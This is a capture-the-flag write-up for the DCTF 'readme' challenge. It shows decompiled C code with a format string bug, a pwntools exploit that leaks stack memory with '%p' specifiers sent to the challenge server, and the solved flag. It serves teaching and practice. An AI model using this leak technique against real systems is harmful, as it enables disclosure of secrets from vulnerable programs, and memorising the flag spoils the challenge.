# Readme

Read me to get the flag.
nc dctf-chall-readme.westeurope.azurecontainer.io 7481

## Challenge

A format string vulnerability to leak a stack variable.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Vulnerable Function

```c
void sym.vuln(void)
{
    undefined8 uVar1;
    int64_t in_FS_OFFSET;
    undefined8 stream;
    char *s;
    char *format;
    int64_t canary;

    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    uVar1 = sym.imp.fopen(0x9b6, 0x9b4);
    sym.imp.fgets(&s, 0x1c, uVar1);
    sym.imp.fclose(uVar1);
    sym.imp.puts(0x9bf);
    sym.imp.fgets(&format, 0x1e, _reloc.stdin);
    sym.imp.printf(0x9d8);
    sym.imp.printf(&format);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        sym.imp.__stack_chk_fail();
    }
    return;
}
```

## Solution

The flag is read onto the stack.
Using the format string vulnerability and the `%p` format specifier, we can leak memory from the stack as hexadecimal numbers.
The flag will be included in this leak and can be converted to ASCII.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dctf-chall-readme.westeurope.azurecontainer.io --port 7481 readme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('readme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dctf-chall-readme.westeurope.azurecontainer.io'
port = int(args.PORT or 7481)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

payload = "%8$p %9$p %10$p %11$p"

io.sendline(payload)
io.recvuntil("hello ")
leak = io.recvuntil("\n", drop=True).split()

hexflag = []

for qword in leak:
    qlist = [qword[i:i+2] for i in range(2, len(qword), 2)][::-1]
    hexflag.extend(qlist)

flag = ""

for i in hexflag:
    char = chr(int(i, 16))
    flag += char

print(flag)

io.interactive()
```

## Flag

`dctf{n0w_g0_r3ad_s0me_b00k5}`

